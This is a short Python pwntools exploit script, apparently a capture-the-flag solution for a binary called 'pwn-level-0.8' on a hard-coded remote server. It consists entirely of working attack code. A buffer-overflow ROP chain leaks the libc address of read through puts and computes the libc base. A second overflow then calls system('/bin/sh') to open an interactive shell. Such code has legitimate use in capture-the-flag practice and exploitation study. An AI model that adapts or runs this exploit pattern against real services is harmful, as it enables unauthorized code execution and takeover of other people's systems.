#!/usr/bin/env python3

# type: ignore
# flake8: noqa

from pwn import *

elf = context.binary = ELF("./pwn-level-0.8", checksec=False)
libc = ELF("./libc6_2.36-9_amd64.so", checksec=False)


def start(argv=[], *a, **kw):
    nc = "nc 103.185.44.122 27428"
    nc = nc.split()
    host = args.HOST or nc[1]
    port = int(args.PORT or nc[2])
    if args.REMOTE:
        return remote(host, port)
    else:
        args_ = [elf.path] + argv
        if args.NA:  # NOASLR
            args_ = ["setarch", "-R"] + args_
        return process(args_, env=env, *a, **kw)


mov_rdi_rsi = 0x00401205
pop_rsi = 0x00401210

env = {}
io = start()

io.sendlineafter(b">> ", b"3")
payload = b"A" * 0x140
payload += flat(
    elf.bss(0xc00),
    pop_rsi, elf.got["read"],
    mov_rdi_rsi,
    elf.plt["puts"],
    elf.sym["_start"]
)
io.sendlineafter(b"screamed: ", payload)
io.recvuntil(b"out of thirst..\n\n")
read_leak = u64(io.recvline().strip().ljust(8, b"\x00"))
log.info(f"{read_leak=:#x}")

libc.address = read_leak - libc.sym["read"]
log.info(f"{libc.address=:#x}")
assert (libc.address & 0xfff == 0)

io.sendlineafter(b">> ", b"3")
payload = b"A" * 0x140
payload += flat(
    elf.bss(0xc00),
    pop_rsi, next(libc.search(b"/bin/sh\x00")),
    mov_rdi_rsi,
    libc.sym["system"],
)
io.sendlineafter(b"screamed: ", payload)

io.interactive()
